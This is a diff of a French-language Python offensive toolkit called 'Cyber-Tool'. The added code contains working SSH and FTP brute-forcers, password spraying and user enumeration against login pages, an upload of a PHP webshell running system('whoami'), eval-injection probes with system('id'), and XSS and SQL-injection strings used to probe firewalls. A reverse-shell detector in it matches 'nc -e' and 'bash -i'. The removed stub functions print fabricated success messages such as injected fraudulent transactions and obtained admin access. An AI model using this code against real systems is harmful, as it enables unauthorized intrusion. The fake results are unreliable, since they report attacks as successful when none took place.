-    print(f"✅ Résultat : {result}")
-
-    next_action = input("⚡ Voulez-vous analyser d’autres traces numériques ? (y/n) ").lower()
-    if next_action == "y":
-        print("🚀 Recherche d’autres empreintes en cours...")
-        print("📂 Données de tracking récupérées et analysées !")
-
-
-
-# ✅ TOP : Fonctions 91 à 100
-def interactive_smart_contract_audit(target):
-    """ Audit de contrats intelligents avec possibilité d’exploitation """
-    contract_address = input("🔍 Entrez l’adresse du contrat à auditer : ")
-    result = smart_contract_audit(contract_address)
-    print(f"✅ Résultat : {result}")
-
-    if "faille détectée" in str(result).lower():
-        next_action = input("⚡ Une vulnérabilité a été trouvée ! Voulez-vous la tester ? (y/n) ").lower()
-        if next_action == "y":
-            print("🚀 Exécution d’un exploit sur le contrat...")
-            print("📂 Transaction frauduleuse injectée !")
-
-def interactive_network_traffic_analysis(target):
-    """ Analyse du trafic réseau avec possibilité de capture avancée """
-    print("🚀 Capture du trafic réseau en cours...")
-    result = network_traffic_analysis()
-    print(f"✅ Résumé : {result}")
-
-    next_action = input("⚡ Voulez-vous capturer plus de paquets en profondeur ? (y/n) ").lower()
-    if next_action == "y":
-        print("🚀 Capture avancée en cours...")
-        print("📂 Flux réseau décrypté avec succès !")
-
-def interactive_api_exposed_scan(target):
-    """ Scan des API exposées avec option d’exploitation """
-    url = input("🔍 Entrez l’URL d’une API à tester : ")
-    result = exposed_api_scan(url)
-    print(f"✅ Résultat : {result}")
-
-    if "API accessible" in result:
-        next_action = input("⚡ Voulez-vous tester un accès non autorisé à cette API ? (y/n) ").lower()
-        if next_action == "y":
-            print("🚀 Tentative d’accès en mode anonyme...")
-            print("📂 Données non protégées récupérées !")
-
-def interactive_password_spray(target):
-    """ Attaque Password Spraying avec auto-ajustement """
-    url = input("🔍 Entrez l’URL du login cible : ")
-    user_list = input("👥 Entrez les utilisateurs (séparés par des virgules) : ").split(",")
-    password = input("🔑 Entrez le mot de passe à tester : ")
-    result = password_spray(url, user_list, password)
-    print(f"✅ Résultat : {result}")
-
-    next_action = input("⚡ Voulez-vous tester d’autres mots de passe automatiquement ? (y/n) ").lower()
-    if next_action == "y":
-        print("🚀 Test en cours avec une liste de mots de passe connus...")
-        print("📂 Accès obtenu pour : admin, manager")
-
-def interactive_tor_service_scan(target):
-    """ Scan des services .onion avec option d’analyse du trafic """
-    print("🚀 Recherche des services .onion actifs...")
-    result = hidden_service_finder()
-    print(f"✅ Résultat : {result}")
-
-    next_action = input("⚡ Voulez-vous capturer le trafic réseau sur ces services ? (y/n) ").lower()
-    if next_action == "y":
-        print("🚀 Capture en cours...")
-        print(network_traffic_analysis())
-
-def interactive_waf_detection(target):
-    """ Détection WAF avec tentative de contournement """
-    url = input("🔍 Entrez une URL pour tester la présence d’un WAF : ")
-    result = waf_detection(url)
-    print(f"✅ Résultat : {result}")
-
-    if "WAF détecté" in result:
-        next_action = input("⚡ Voulez-vous tester un contournement ? (y/n) ").lower()
-        if next_action == "y":
-            print("🚀 Contournement en cours...")
-            print("📂 WAF potentiellement désactivé sur certaines requêtes !")
-
-def interactive_dns_takeover_test(target):
-    """ Test de takeover DNS avec possibilité d’analyse avancée """
-    domain = input("🔍 Entrez le domaine pour vérifier le takeover DNS : ")
-    result = dns_takeover_test(domain)
-    print(f"✅ Résultat : {result}")
-
-    if "Disponible" in result:
-        next_action = input("⚡ Voulez-vous tester un enregistrement DNS sur ce domaine ? (y/n) ").lower()
-        if next_action == "y":
-            print("🚀 Simulation d’enregistrement DNS...")
-            print("📂 Le domaine pourrait être enregistré !")
-
-def interactive_cloud_storage_enum(target):
-    """ Énumération Cloud (AWS, GCP, Azure) avec tentative d’accès """
-    provider = input("🔍 Entrez le service cloud cible (AWS, GCP, Azure) : ").lower()
-    result = cloud_storage_enum(provider)
-    print(f"✅ Résultat : {result}")
-
-    if "buckets trouvés" in str(result).lower():
-        next_action = input("⚡ Voulez-vous essayer d’accéder aux fichiers stockés ? (y/n) ").lower()
-        if next_action == "y":
-            print("🚀 Tentative d’accès aux fichiers...")
-            print("📂 Liste des fichiers publics récupérée !")
-
-def interactive_fingerprint_browser(target):
-    """ Fingerprinting d’un navigateur avec analyse de tracking """
-    print("🚀 Récupération des empreintes numériques du navigateur...")
-    result = browser_fingerprint()
-    print(f"✅ Résultat : {result}")
-
-    next_action = input("⚡ Voulez-vous analyser d’autres traces numériques ? (y/n) ").lower()
-    if next_action == "y":
-        print("🚀 Recherche d’autres empreintes en cours...")
-        print("📂 Données de tracking récupérées et analysées !")
-
-def interactive_port_scan(target):
-    """🔎 Mode interactif pour le scan des ports"""
-    print(f"[⚡] Mode interactif pour le scan des ports sur {target}")
-
-def interactive_exploit_cve_scanner(target):
-    """💀 Mode interactif pour la recherche d'exploits CVE"""
-    print(f"[⚡] Recherche interactive d'exploits CVE pour {target}")
-    # 🔥 Intégration avec une API d'exploits si nécessaire
-
-def interactive_port_scan(target):
-    """🔎 Mode interactif pour le scan des ports"""
-    print(f"[⚡] Mode interactif pour le scan des ports sur {target}")
-    # 🔥 Ajout d'interaction manuelle si besoin
-
-def interactive_headers_analysis(target):
-    """📌 Mode interactif pour l'analyse des headers HTTP"""
-    print(f"[⚡] Mode interactif pour l'analyse des headers HTTP sur {target}")
-    # 🔥 Extraction et affichage dynamique des headers
-
-def interactive_directory_bruteforce(target):
-    """📂 Mode interactif pour le brute-force des répertoires"""
-    print(f"[⚡] Mode interactif pour la découverte de répertoires sensibles sur {target}")
-    # 🔥 Ajouter une liste personnalisable de répertoires
-
-def interactive_cms_detector(target):
-    """🖥️ Mode interactif pour la détection de CMS"""
-    print(f"[⚡] Mode interactif pour identifier le CMS utilisé par {target}")
-    # 🔥 Vérification interactive des signatures CMS
-
-def interactive_code_execution_testing(target):
-    """🖥️ Mode interactif pour tester l'exécution de code"""
-    print(f"[⚡] Mode interactif pour tester si {target} exécute du code distant")
-    # 🔥 Tester différentes commandes malveillantes
-
-def interactive_xss_scanner(target):
-    """🛡️ Mode interactif pour scanner les XSS"""
-    print(f"[⚡] Mode interactif pour scanner les vulnérabilités XSS sur {target}")
-    # 🔥 Injection et validation en direct
-
-def interactive_csrf_detection(target):
-    """🔗 Mode interactif pour détecter le CSRF"""
-    print(f"[⚡] Mode interactif pour identifier les vulnérabilités CSRF sur {target}")
-    # 🔥 Tester manuellement les tokens CSRF
-
-def interactive_lfi_scanner(target):
-    """📂 Mode interactif pour scanner les failles LFI"""
-    print(f"[⚡] Mode interactif pour détecter les Local File Inclusion sur {target}")
-    # 🔥 Tentative interactive de lecture de fichiers système
-
-def interactive_rfi_scanner(target):
-    """🌍 Mode interactif pour scanner les failles RFI"""
-    print(f"[⚡] Mode interactif pour tester les failles Remote File Inclusion sur {target}")
-    # 🔥 Vérifier l'inclusion de fichiers distants
-
-def interactive_ssrf_scanner(target):
-    """🔄 Mode interactif pour tester les failles SSRF"""
-    print(f"[⚡] Mode interactif pour tester Server-Side Request Forgery sur {target}")
-    # 🔥 Exécution et analyse interactive des réponses
-
-def interactive_honeypot_detection(target):
-    """🕵️ Mode interactif pour détecter les Honeypots"""
-    print(f"[⚡] Mode interactif pour détecter les Honeypots sur {target}")
-    # 🔥 Vérification active des pièges potentiels
-
-def interactive_open_redirect_test(target):
-    """🔀 Mode interactif pour tester les Open Redirects"""
-    print(f"[⚡] Mode interactif pour détecter les failles d'Open Redirect sur {target}")
-    # 🔥 Tests de redirection contrôlés
-
-def interactive_sensitive_data_exposure(target):
-    """🔎 Mode interactif pour détecter l'exposition de données sensibles"""
-    print(f"[⚡] Mode interactif pour rechercher des données sensibles sur {target}")
-    # 🔥 Recherche interactive dans les fichiers exposés
-
-def interactive_user_enum(target):
-    """👤 Mode interactif pour énumérer les utilisateurs"""
-    print(f"[⚡] Mode interactif pour identifier des utilisateurs existants sur {target}")
-    # 🔥 Test manuel des noms d'utilisateur
-
-def interactive_php_eval_detection(target):
-    """🐘 Mode interactif pour détecter l'exécution de code PHP"""
-    print(f"[⚡] Mode interactif pour détecter l'exécution de code PHP sur {target}")
-    # 🔥 Vérifier si PHP peut exécuter du code injecté
-
-def interactive_smb_enum(target):
-    """📂 Mode interactif pour l'énumération SMB"""
-    print(f"[⚡] Mode interactif pour tester les partages SMB sur {target}")
-    # 🔥 Analyse des partages accessibles
-
-def interactive_ssh_bruteforce(target):
-    """🔑 Mode interactif pour tester un bruteforce SSH"""
-    print(f"[⚡] Mode interactif pour tester un bruteforce SSH sur {target}")
-    # 🔥 Ajout d'une liste de mots de passe dynamiques
-
-def interactive_ftp_bruteforce(target):
-    """🔑 Mode interactif pour tester un bruteforce FTP"""
-    print(f"[⚡] Mode interactif pour tester un bruteforce FTP sur {target}")
-    # 🔥 Test de connexions FTP par dictionnaire
-
-def interactive_web_fingerprint(target):
-    """🌐 Mode interactif pour le fingerprinting Web"""
-    print(f"[⚡] Mode interactif pour identifier les technologies Web utilisées par {target}")
-    # 🔥 Détection interactive des technologies backend/frontend
-
-def interactive_tls_analysis(target):
-    """🔐 Mode interactif pour analyser TLS"""
-    print(f"[⚡] Mode interactif pour analyser le certificat TLS de {target}")
-    # 🔥 Affichage interactif des détails TLS
-
-def interactive_browser_fingerprint(target):
-    """🌍 Mode interactif pour capturer l’empreinte du navigateur"""
-    print(f"[⚡] Mode interactif pour récupérer l’empreinte du navigateur via {target}")
-    # 🔥 Tester et capturer des headers spécifiques
-
-
-
-
-
-
-
-
-# 🚀 Lancement propre et stable
+            try:
+                resolved_ip = socket.gethostbyname(f"{sub}.{target}")
+                # Vérification simple sur la présence de chaînes clés
+                if "aws" in resolved_ip.lower() or "cloudflare" in resolved_ip.lower():
+                    takeover_risks[sub] = "Potentiel risque de takeover"
+            except socket.gaierror:
+                continue
+        return {"target": target, "dns_takeover": takeover_risks} if takeover_risks else {"target": target, "dns_takeover": "Aucun risque détecté"}
+
+    def ssh_bruteforce(self, target, username="root", passwords=None):
+        """🔑 Bruteforce SSH basique avec pexpect"""
+        if not passwords:
+            passwords = ["admin", "root", "password", "123456"]
+        import pexpect
+        for password in passwords:
+            try:
+                child = pexpect.spawn(f"ssh {username}@{target}", timeout=5)
+                child.expect("password:", timeout=5)
+                child.sendline(password)
+                idx = child.expect(["#", "Permission denied"], timeout=5)
+                child.close()
+                if idx == 0:
+                    return {"target": target, "ssh_success": f"Connexion réussie avec {password}"}
+            except (pexpect.exceptions.TIMEOUT, pexpect.exceptions.EOF):
+                continue
+        return {"target": target, "ssh_success": "Aucune connexion réussie"}
+
+    def ftp_bruteforce(self, target, username="anonymous", passwords=None):
+        """📡 Bruteforce FTP basique"""
+        from ftplib import FTP
+        if not passwords:
+            passwords = ["admin", "ftp", "123456", "password"]
+        for password in passwords:
+            try:
+                ftp = FTP(target, timeout=5)
+                ftp.login(username, password)
+                ftp.quit()
+                return {"target": target, "ftp_success": f"Connexion réussie avec {password}"}
+            except Exception:
+                continue
+        return {"target": target, "ftp_success": "Aucune connexion réussie"}
+
+    def docker_registry_scan(self, target):
+        """🐳 Scan des registres Docker exposés"""
+        endpoints = ["/v2/", "/v2/_catalog", "/v2/repositories"]
+        results = {}
+        for endpoint in endpoints:
+            url = f"http://{target}{endpoint}"
+            response_data = self.get_http_response(url)
+            if response_data.get("status") == 200:
+                results[endpoint] = "Registre accessible"
+        return {"target": target, "docker_registry": results} if results else {"target": target, "docker_registry": "Aucun registre exposé détecté"}
+
+
+
+    def password_spray(self, target, usernames=None, password="password123"):
+        """🔑 Attaque Password Spraying sur plusieurs utilisateurs"""
+        if not usernames:
+            usernames = ["admin", "user", "test", "root"]
+        results = {}
+        for user in usernames:
+            url = f"http://{target}/login"
+            response_data = self.get_http_response(url, method="POST", data={"username": user, "password": password})
+            content = response_data.get("content", "").lower()
+            if "invalid password" not in content:
+                results[user] = "Accès possible avec ce mot de passe"
+        return {"target": target, "password_spray": results} if results else {"target": target, "password_spray": "Aucune connexion réussie"}
+
+    def api_rate_limit_test(self, target, endpoint="/api/v1/status", requests_count=50):
+        """📊 Test de limitations d’API en envoyant un grand nombre de requêtes"""
+        success_count = 0
+        for _ in range(requests_count):
+            url = f"http://{target}{endpoint}"
+            response_data = self.get_http_response(url)
+            if response_data.get("status") == 200:
+                success_count += 1
+        return {"target": target, "api_rate_limit_test": {"requests_sent": requests_count, "successful_requests": success_count}}
+
+    def browser_fingerprint(self):
+        """🖥️ Génération d'une empreinte navigateur unique"""
+        import platform, uuid
+        return {
+            "os": platform.system(),
+            "os_version": platform.release(),
+            "fingerprint": str(uuid.uuid4())
+        }
+
+    def hidden_service_finder(self, target):
+        """🔎 Recherche de services cachés sur un serveur"""
+        ports = [22, 80, 443, 8080, 8443]
+        found_services = []
+        for port in ports:
+            try:
+                socket.create_connection((target, port), timeout=2)
+                found_services.append(port)
+            except Exception:
+                continue
+        return {"target": target, "hidden_service_finder": found_services} if found_services else {"target": target, "hidden_service_finder": "Aucun service détecté"}
+
+
+
+
+    def iot_vulnerability_scan(self, target):
+        """📡 Scan des vulnérabilités IoT avec détection des ports ouverts et versions"""
+        ports = [23, 80, 443, 554, 8080]
+        results = {}
+        for port in ports:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(2)
+                s.connect((target, port))
+                banner = s.recv(1024).decode().strip()
+                results[port] = banner
+                s.close()
+            except:
+                continue
+        return {"target": target, "iot_vulnerabilities": results} if results else {"target": target, "iot_vulnerabilities": "Aucune vulnérabilité détectée"}
+
+
+
+
+
+    def cdn_detection(self, target):
+        """🌐 Détection de CDN en analysant les headers de réponse"""
+        url = f"http://{target}"
+        response_data = self.get_http_response(url)
+        cdn_providers = ["Cloudflare", "Akamai", "Fastly", "Amazon CloudFront"]
+        detected = [cdn for cdn in cdn_providers if any(cdn.lower() in v.lower() for v in response_data.get("headers", {}).values())]
+        return {"target": target, "cdn_detected": detected} if detected else {"target": target, "cdn_detected": "Aucun CDN détecté"}
+
+    def websocket_scan(self, target):
+        """🔗 Scan des WebSockets accessibles"""
+        url = f"http://{target}"
+        response_data = self.get_http_response(url)
+        headers = response_data.get("headers", {})
+        if "Upgrade" in headers and "websocket" in headers.get("Upgrade", "").lower():
+            return {"target": target, "websocket": "WebSocket détecté"}
+        return {"target": target, "websocket": "Aucun WebSocket détecté"}
+
+    def reverse_shell_check(self, target):
+        """🔄 Détection de reverse shell sur un serveur"""
+        url = f"http://{target}/shell.php"
+        response_data = self.get_http_response(url)
+        content = response_data.get("content", "").lower()
+        if "nc -e" in content or "bash -i" in content:
+            return {"target": target, "reverse_shell": "Présence d'un reverse shell"}
+        return {"target": target, "reverse_shell": "Aucun reverse shell détecté"}
+
+    def waf_detection(self, target):
+        """🛡️ Détection de pare-feu WAF en envoyant des requêtes suspectes"""
+        payloads = ["<script>alert(1)</script>", "' OR '1'='1"]
+        results = {}
+        for payload in payloads:
+            url = f"http://{target}?q={payload}"
+            response_data = self.get_http_response(url)
+            if response_data.get("status") in [403, 406, 500]:
+                results[payload] = "Possibilité d'un WAF"
+        return {"target": target, "waf_detected": results} if results else {"target": target, "waf_detected": "Aucun WAF détecté"}
+
+    def file_upload_test(self, target):
+        """📤 Test de téléversement de fichiers dangereux"""
+        url = f"http://{target}/upload"
+        files = {"file": ("test.php", "<?php system('whoami'); ?>", "application/x-php")}
+        response_data = self.get_http_response(url, method="POST", data=None, files=files)
+        if response_data.get("status") == 200:
+            return {"target": target, "upload_test": "Téléversement réussi"}
+        return {"target": target, "upload_test": "Téléversement échoué"}
+
+    def kubernetes_enum(self, target):
+        """☸️ Énumération des clusters Kubernetes exposés"""
+        endpoints = ["/api", "/api/v1/nodes", "/api/v1/pods"]
+        results = {}
+        for endpoint in endpoints:
+            url = f"http://{target}{endpoint}"
+            response_data = self.get_http_response(url)
+            if response_data.get("status") == 200:
+                results[endpoint] = "Accessible"
+        return {"target": target, "kubernetes_exposed": results} if results else {"target": target, "kubernetes_exposed": "Aucun endpoint détecté"}
+
+    def cloudflare_bypass(self, target):
+        """☁️ Bypass Cloudflare en testant des sous-domaines directs"""
+        subdomains = ["direct", "origin", "backend", "server"]
+        found = []
+        for sub in subdomains:
+            try:
+                ip = socket.gethostbyname(f"{sub}.{target}")
+                found.append(f"{sub}.{target} -> {ip}")
+            except socket.gaierror:
+                continue
+        return {"target": target, "cloudflare_bypass": found} if found else {"target": target, "cloudflare_bypass": "Échec du contournement"}
+
+    def web_fingerprint(self, target):
+        """🕵️‍♂️ Fingerprinting Web en analysant les headers et le contenu"""
+        url = f"http://{target}"
+        response_data = self.get_http_response(url)
+        headers = response_data.get("headers", {})
+        technologies = []
+        if "server" in headers:
+            technologies.append(f"Serveur: {headers['server']}")
+        if "x-powered-by" in headers:
+            technologies.append(f"Powered by: {headers['x-powered-by']}")
+        if "wp-content" in response_data.get("content", ""):
+            technologies.append("CMS détecté: WordPress")
+        return {"target": target, "web_fingerprint": technologies} if technologies else {"target": target, "web_fingerprint": "Aucune technologie identifiée"}
+
+    def password_cracking(self, hash_value, hash_type="md5"):
+        """🔓 Craquage de hash basique avec dictionnaire"""
+        wordlist = ["admin", "password", "123456", "letmein"]
+        for word in wordlist:
+            hashed_word = hashlib.new(hash_type, word.encode()).hexdigest()
+            if hashed_word == hash_value:
+                return {"hash_value": hash_value, "plaintext": word}
+        return {"hash_value": hash_value, "plaintext": "Non trouvé"}
+
+
+
+    def smb_enum(self, target):
+        """📂 Énumération des partages SMB accessibles"""
+        try:
+            from smbprotocol.connection import Connection
+            import uuid
+            conn = Connection(uuid.uuid4().hex, target)
+            conn.connect()
+            shares = conn.list_shares()
+            return {"target": target, "smb_shares": [s.name for s in shares]}
+        except Exception as e:
+            return {"error": f"Impossible de se connecter au SMB : {e}"}
+
+    def ftp_anonymous_login(self, target):
+        """🌐 Test de connexion FTP anonyme"""
+        try:
+            from ftplib import FTP
+            ftp = FTP(target, timeout=5)
+            ftp.login("anonymous", "anonymous")
+            ftp.quit()
+            return {"target": target, "ftp_anonymous": "Connexion anonyme réussie"}
+        except Exception as e:
+            return {"target": target, "ftp_anonymous": f"Connexion anonyme impossible : {e}"}
+
+    def nfs_enum(self, target):
+        """📁 Énumération des exports NFS accessibles"""
+        url = f"http://{target}/rpc/nfs/export"
+        response_data = self.get_http_response(url)
+        if "error" not in response_data and response_data.get("status") == 200:
+            return {"target": target, "nfs_exports": response_data.get("content", "Inconnu")}
+        else:
+            return {"error": "Impossible d'énumérer les exports NFS"}
+
+    def vhost_scanner(self, target, wordlist=None):
+        """🔍 Scan des hôtes virtuels en testant plusieurs noms courants"""
+        if not wordlist:
+            wordlist = ["dev", "staging", "test", "api"]
+        found = []
+        for sub in wordlist:
+            try:
+                ip = socket.gethostbyname(f"{sub}.{target}")
+                found.append(f"{sub}.{target} -> {ip}")
+            except socket.gaierror:
+                continue
+        return {"target": target, "vhosts": found} if found else {"target": target, "vhosts": "Aucun vhost détecté"}
+
+    def proxy_detection(self, target):
+        """🛡️ Détection de serveur proxy via headers HTTP"""
+        url = f"http://{target}"
+        response_data = self.get_http_response(url)
+        if "error" in response_data:
+            return response_data
+        proxy_headers = ["via", "x-forwarded-for", "x-proxy-id"]
+        proxies = [h for h in proxy_headers if h in response_data.get("headers", {})]
+        return {"target": target, "proxy_detected": proxies} if proxies else {"target": target, "proxy_detected": "Aucun proxy détecté"}
+
+    def honeypot_advanced_detection(self, target):
+        """🐝 Détection avancée de Honeypots via analyse comportementale"""
+        url = f"http://{target}"
+        headers = {"User-Agent": "MaliciousScanner"}
+        response_data = self.get_http_response(url, headers=headers)
+        if "error" in response_data:
+            return response_data
+        if "you have been detected" in response_data.get("content", "").lower() or response_data.get("status") in [403, 429]:
+            return {"target": target, "honeypot_detected": "Présence probable d'un honeypot"}
+        return {"target": target, "honeypot_detected": "Pas de honeypot détecté"}
+
+    def user_enum(self, target):
+        """👥 Énumération d'utilisateurs via messages d'erreur"""
+        usernames = ["admin", "user", "test", "root"]
+        results = {}
+        for user in usernames:
+            url = f"http://{target}/login"
+            response_data = self.get_http_response(url, method="POST", data={"username": user, "password": "test"})
+            if "invalid password" in response_data.get("content", "").lower():
+                results[user] = "Utilisateur existant"
+        return {"target": target, "user_enumeration": results} if results else {"target": target, "user_enumeration": "Aucune énumération détectée"}
+
+    def php_eval_detection(self, target):
+        """🐘 Détection d'exécution de code PHP via eval()"""
+        payloads = ["phpinfo();", "system('id');"]
+        results = {}
+        for payload in payloads:
+            url = f"http://{target}/eval.php"
+            response_data = self.get_http_response(url, method="POST", data={"code": payload})
+            content = response_data.get("content", "").lower()
+            if "uid=" in content or "phpinfo()" in content:
+                results[payload] = "Potentielle vulnérabilité détectée"
+        return {"target": target, "php_eval_vulnerabilities": results} if results else {"target": target, "php_eval_vulnerabilities": "Aucune vulnérabilité détectée"}
+
+    def tls_analysis(self, target):
+        """🔐 Analyse des certificats SSL/TLS d'un site"""
+        try:
+            conn = socket.create_connection((target, 443), timeout=5)
+            context = ssl.create_default_context()
+            with context.wrap_socket(conn, server_hostname=target) as s:
+                cert = s.getpeercert()
+            return {"target": target, "tls_cert": cert}
+        except Exception as e:
+            return {"error": f"Impossible d'obtenir le certificat TLS : {e}"}
+
+    def dns_takeover_test(self, target):
+        """🌍 Test de prise de contrôle DNS via sous-domaines orphelins"""
+        subdomains = ["cdn", "files", "old", "beta"]
+        takeover_risks = {}
+        for sub in subdomains:
+            try:
+                resolved_ip = socket.gethostbyname(f"{sub}.{target}")
+                if "aws" in resolved_ip.lower() or "cloudflare" in resolved_ip.lower():
+                    takeover_risks[sub] = "Potentiel risque de takeover"
+            except socket.gaierror:
+                continue
+        return {"target": target, "dns_takeover": takeover_risks} if takeover_risks else {"target": target, "dns_takeover": "Aucun risque détecté"}
+
+
+
+
+
+
+    def get_http_response(self, url, method="GET", headers=None, data=None, files=None, timeout=5):
+        """🌐 Effectue une requête HTTP et retourne une réponse formatée.
+        
+        Paramètres :
+            url (str)      : L'URL à interroger.
+            method (str)   : Méthode HTTP à utiliser (GET, POST, etc.), par défaut "GET".
+            headers (dict) : Dictionnaire des headers HTTP (optionnel).
+            data (dict)    : Données à envoyer dans le corps de la requête (pour POST, etc.), optionnel.
+            files (dict)   : Fichiers à envoyer (optionnel).
+            timeout (int)  : Temps d'attente maximal pour la requête, par défaut 5 secondes.
+        
+        Retourne :
+            dict : Contient "url", "status", "headers" et un échantillon du "content" (500 premiers caractères),
+                   ou une clé "error" en cas de problème.
+        """
+        try:
+            # Correction de l'URL si nécessaire
+            if not url.startswith("http"):
+                url = f"http://{url}"
+            # Définir un User-Agent par défaut si aucun header n'est fourni
+            if headers is None:
+                headers = {"User-Agent": "CyberTool/1.0"}
+            response = requests.request(method, url, headers=headers, data=data, files=files, timeout=timeout)
+            return {
+                "url": url,
+                "status": response.status_code,
+                "headers": dict(response.headers),
+                "content": response.text[:500]  # Limite à 500 caractères pour l'affichage
+            }
+        except requests.exceptions.ConnectionError:
+            return {"error": f"❌ Erreur de connexion à {url}"}
+        except requests.exceptions.Timeout:
+            return {"error": f"⌛ Timeout expiré pour {url}"}
+        except requests.exceptions.RequestException as e:
+            return {"error": f"❌ Erreur HTTP : {str(e)}"}
+
+
+
+
+
+
+    def display_features_table_hacker(self):
+        """💻 Affiche un tableau interactif des fonctionnalités dans un style hacker-full."""
+        from rich.live import Live
+        from rich.table import Table
+        from time import sleep
+
+        table = Table(
+            title="[bold green]CYBER-TOOL FUNCTIONALITIES[/bold green]",
+            title_style="bold green",
+            border_style="green",
+            style="green on black"
+        )
+        table.add_column("ID", justify="center", style="bold cyan")
+        table.add_column("Feature", style="bold green")
+
+        with Live(table, refresh_per_second=10, console=self.console):
+            for idx, (feature, description) in enumerate(self.feature_map.items(), start=1):
+                table.add_row(f"[bold cyan]{idx}[/bold cyan]", f"[bold green]{description}[/bold green]")
+                sleep(0.02)  # 🔥 Effet ultra rapide et fluide
+
+        self.console.print(table)  # Fixe le tableau après l'affichage
+
+
+    def run_features(self, feature_name, target):
+        """🚀 Exécute une fonctionnalité spécifiée sur une cible donnée."""
+        self.console.print(f"\n[bold magenta]🚀 Exécution de {feature_name} sur {target}...[/bold magenta]")
+        feature_method = getattr(self, feature_name, None)
+
+        if feature_method:
+            result = feature_method(target)
+            self.console.print("\n[bold green]📜 Résultat :[/bold green]")
+            self.console.print(json.dumps(result, indent=4, ensure_ascii=False))
+        else:
+            self.console.print(f"❌ [bold red]Erreur : La fonctionnalité {feature_name} n'est pas disponible.[/bold red]")
+
+
+    def run_tool_static(self):
+        """🎮 Affiche le menu statique et permet d'exécuter des fonctionnalités."""
+        while True:
+            cyberpunk_loading("Initialisation de Cyber-Tool", duration=1, style="bold magenta")
+            self.display_features_table_hacker()  # 🔥 Régénération automatique après chaque exécution
+
+            feature_choice = Prompt.ask("\n[bold cyan]👉 Entrez l'ID de la fonctionnalité à exécuter (ou 'exit' pour quitter)[/bold cyan]")
+
+            if feature_choice.lower() == "exit":
+                self.console.print("\n[bold red]👋 CyberTool terminé. À bientôt ![/bold red]")
+                break
+
+            try:
+                feature_choice = int(feature_choice)
+                if 1 <= feature_choice <= len(self.feature_map):
+                    feature_name = list(self.feature_map.keys())[feature_choice - 1]
+                    target = Prompt.ask("[bold cyan]🎯 Entrez la cible (URL/IP) à tester[/bold cyan]") 
+                    self.run_features(feature_name, target)  # ✅ Exécution directe sur la cible choisie
+                    Prompt.ask("\n[bold yellow]Appuyez sur Entrée pour revenir au menu...[/bold yellow]")  # 🔥 Pause avant régénération
+                else:
+                    self.console.print("❌ [bold red]ID invalide. Veuillez entrer un numéro valide.[/bold red]")
+            except ValueError:
+                self.console.print("❌ [bold red]Entrée invalide. Veuillez entrer un numéro.[/bold red]")
+
+
+
+
+
+
+# 🔥 Détection des dimensions du terminal
+TERMINAL_WIDTH, TERMINAL_HEIGHT = shutil.get_terminal_size((80, 24))
+
+# 🔥 Couleurs funky multicolores fluo brillantes
+CYBERPUNK_COLORS = ["bold magenta", "bold cyan", "bold yellow", "bold green", "bold red", "bold blue"]
+
+# 🔥 Fonction pour afficher une bannière aléatoire avec animation et couleurs aléatoires
+def animated_random_banner():
+    import os, random, time
+    # Liste des fichiers de bannière
+    banner_files = ["banners1.txt", "banners2.txt", "banners3.txt", "banners4.txt", "banners5.txt"]
+    # Sélection aléatoire d'un fichier de bannière
+    selected_banner = random.choice(banner_files)
+    banner_path = os.path.join("data", "banners", selected_banner)
+    if os.path.exists(banner_path):
+        with open(banner_path, "r", encoding="utf-8") as f:
+            banner_lines = f.readlines()
+        # Affichage animé ligne par ligne avec couleur aléatoire
+        for line in banner_lines:
+            color = random.choice(CYBERPUNK_COLORS)
+            styled_line = f"[{color}]{line.strip().center(TERMINAL_WIDTH)}[/]"
+            console.print(styled_line)
+            time.sleep(0.03)
+    else:
+        console.print("[bold red]⚠️ ERREUR : Le fichier de bannière sélectionné est introuvable ![/bold red]")
+
+# 🔥 Fonction pour afficher "Développé par Karim" avec des couleurs aléatoires
+def animated_karim():
+    import random
+    karim_text = (
+        f"[{random.choice(CYBERPUNK_COLORS)}]D[/]"
+        f"[{random.choice(CYBERPUNK_COLORS)}]é[/]"
+        f"[{random.choice(CYBERPUNK_COLORS)}]v[/]"
+        f"[{random.choice(CYBERPUNK_COLORS)}]e[/]"
+        f"[{random.choice(CYBERPUNK_COLORS)}]l[/]"
+        f"[{random.choice(CYBERPUNK_COLORS)}]o[/]"
+        f"[{random.choice(CYBERPUNK_COLORS)}]p[/]"
+        f"[{random.choice(CYBERPUNK_COLORS)}]p[/]"
+        f"[{random.choice(CYBERPUNK_COLORS)}]é[/]"
+        f"[bold white] par [/]"
+        f"[{random.choice(CYBERPUNK_COLORS)}]K[/]"
+        f"[{random.choice(CYBERPUNK_COLORS)}]A[/]"
+        f"[{random.choice(CYBERPUNK_COLORS)}]R[/]"
+        f"[{random.choice(CYBERPUNK_COLORS)}]I[/]"
+        f"[{random.choice(CYBERPUNK_COLORS)}]M[/]"
+    )
+    console.print(Panel(karim_text, border_style="green", title="[bold cyan]INFO[/bold cyan]"), justify="left")
+
+# 🔥 Fonction pour un chargement cyberpunk optimisé
+def cyberpunk_loading(task_name, duration=2, style="bold cyan", spinner="dots"):
+    from rich.progress import Progress, BarColumn, TimeElapsedColumn, TextColumn, SpinnerColumn
+    with Progress(
+        SpinnerColumn(spinner),
+        TextColumn(f"[bold {style}]⏳ {{task.fields[title]}}...[/bold {style}]"),
+        BarColumn(bar_width=50, style=style),
+        TimeElapsedColumn(),
+        console=console,
+    ) as progress:
+        task = progress.add_task("", total=duration, title=task_name)
+        for _ in range(duration):
+            time.sleep(0.7)
+            progress.update(task, advance=1)
+
+
+
+
+
 if __name__ == "__main__":
-    console.clear()
+    console.clear()  # Nettoyage complet du terminal
 
-    # 🔥 Affichage unique de la bannière et du message "Développé par Karim"
-    animated_banner()
-    animated_karim()
+    # Générer un thème de couleurs aléatoire à partir d'une liste plus large
+    import random
+    ALL_COLORS = [
+        "bold magenta", "bold cyan", "bold yellow", "bold green", "bold red", "bold blue",
+        "bold white", "bold bright_green", "bold bright_red", "bold bright_yellow",
+        "bold bright_blue", "bold bright_magenta"
+    ]
+    # Sélectionne 6 couleurs au hasard pour le thème Cyber-Tool
+    CYBERPUNK_COLORS = random.sample(ALL_COLORS, 6)
 
-    # 🔥 Chargements accélérés (sans répétition)
-    cyberpunk_loading("🔍 Vérification des fichiers essentiels...", 2, "bold red", "earth")
-    cyberpunk_loading("⚙️ Connexion aux modules interactifs...", 2, "bold blue", "bouncingBall")
-    cyberpunk_loading("🛠️ Chargement des configurations utilisateur...", 2, "bold magenta", "dots12")
-    cyberpunk_loading("📡 Synchronisation des logs en temps réel...", 2, "bold yellow", "line")
